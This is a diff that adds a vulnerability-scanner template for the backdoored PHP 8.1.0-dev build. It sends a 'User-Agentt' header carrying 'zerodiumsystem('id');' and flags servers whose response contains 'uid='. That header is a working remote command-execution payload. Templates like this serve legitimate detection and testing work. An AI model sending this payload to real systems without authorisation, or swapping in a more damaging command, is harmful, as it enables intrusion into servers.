@@ -1,0 +1,18 @@
+id: php-8.1.0-dev-rce-sqli
+info:
+  name: PHP 8.1.0-dev RCE & SQLi via User-Agentt header
+  author: 0xpugazh
+  severity: high
+  reference: https://twitter.com/zapstiko/status/1701284899536126036
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      User-Agentt: zerodiumsystem('id');
+    matchers:
+      - type: word
+        words:
+          - "uid="
+        part: body
